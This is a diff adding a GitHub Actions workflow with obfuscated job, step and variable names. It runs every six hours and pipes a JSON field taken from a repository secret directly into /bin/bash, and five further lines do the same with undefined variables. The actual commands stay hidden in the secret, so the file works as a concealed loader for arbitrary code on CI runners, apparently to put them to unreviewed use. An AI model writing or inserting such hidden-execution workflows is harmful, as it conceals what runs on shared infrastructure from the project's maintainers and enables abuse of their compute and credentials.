@@ -1,0 +1,22 @@
+name: wulunduomelangbeidan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wulunduomelangbeidan
+        env:
+          gmyr6144: ${{ secrets.gmyr6144 }}
+        run: |
+          echo $gmyr6144 | jq -r .hnhc440 | /bin/bash
+          echo $pnq9 | jq -r .poiyg9 | /bin/bash
+          echo $o19 | jq -r .c9 | /bin/bash
+          echo $rgc134 | jq -r .kode446 | /bin/bash
+          echo $feq9 | jq -r .bh9 | /bin/bash
+          echo $vu94 | jq -r .yiga11789 | /bin/bash
+
